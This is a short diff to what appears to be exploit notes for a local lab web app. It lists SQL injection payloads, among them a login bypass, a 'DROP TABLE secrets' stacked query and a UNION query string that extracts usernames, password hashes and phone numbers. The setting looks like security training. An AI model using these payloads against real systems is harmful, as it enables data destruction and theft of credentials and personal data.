@@ -7,7 +7,7 @@ on login form, will cause us to login as first user
 " ; DROP TABLE secrets; --
 setup the secrets table first, this will drop the table. Do this on register since it runs executescript
 
-http://127.0.0.1:5000/?namelike=%22%20union%20select%20username,password%20from%20users;%20--
+http://127.0.0.1:5000/?namelike=%22%20union%20select%20username,password,phone%20from%20users;%20--
 this time for query paramsat index, if we are logged in, we can abuse the search feature to get password
 hashes from all the users using a union injection
 
